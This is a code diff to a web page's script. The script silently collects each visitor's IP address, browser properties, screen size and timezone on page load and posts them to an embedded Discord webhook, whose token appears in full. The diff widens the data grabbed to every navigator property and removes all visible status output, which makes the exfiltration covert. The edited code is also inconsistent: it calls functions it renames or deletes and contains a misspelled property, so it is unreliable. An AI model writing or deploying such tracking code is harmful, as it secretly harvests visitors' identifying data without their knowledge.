@@ -18,7 +18,7 @@
   <script>
     const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1465917225818132575/eaIqusPShhtUlsTUlwmoZurmLcyFfqWrDsWSXe78jubMr4MSvFrR7siYeFWlIQ_aaqHm";
 
-async function getUserInfo() {
+function collectClientInfo(ip) {
   let ip = "unavailable";
 
   try {
@@ -32,6 +32,29 @@ async function getUserInfo() {
   } catch {
     // silently ignore IP failure
   }
+  const props = new Set();
+  let obj = navigator;
+
+  while (obj) {
+    Object.getOwnPropertyNames(obj).forEach(p => props.add(p));
+    obj = Object.getPrototypeOf(obj);
+  }
+
+  const navigatorDump = {};
+
+  for (const key of [...props].sort()) {
+    try {
+      const value = navigator[key];
+      navigatorDump[key] =
+        typeof value === "object" && value !== null
+          ? `[object ${value.constructor?.name || "Object"}]`
+          : typeof value === "function"
+          ? "[function]"
+          : value;
+    } catch {
+      navigatorDump[key] = "[inaccessible]";
+    }
+  }
 
   return {
     ip,
@@ -40,37 +63,13 @@ async function getUserInfo() {
     language: navigator.language,
     screen: `${screen.width}x${screen.height}`,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timestamp: new Date().toISOString()
+    timestamp: new Date().toISOString(),
+    navigator: navigatorDump,
+    connectStart: window.preformance.connectStart
   };
 }
-async function sendToDiscord(data) {
-  const content = Object.entries(data)
-    .map(([k, v]) => `**${k}**: ${v}`)
-    .join("\n");
 
-  const payload = {
-    content: content
-  };
-
-  await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-}
-
-var sendinfo = async () => {
-  const status = document.getElementById("status");
-  status.textContent = "Collecting info...";
-
-  try {
-    const info = await getUserInfo();
-    await sendToDiscord(info);
-    status.textContent = "Sent successfully.";
-  } catch (err) {
-    status.textContent = "Error:\n" + err.message;
-  }
-};
+var sendinfo = async () => {try {const info = await getUserInfo();await sendToDiscord(info);} catch (err) {}};
 sendinfo();
   </script>
 </body>
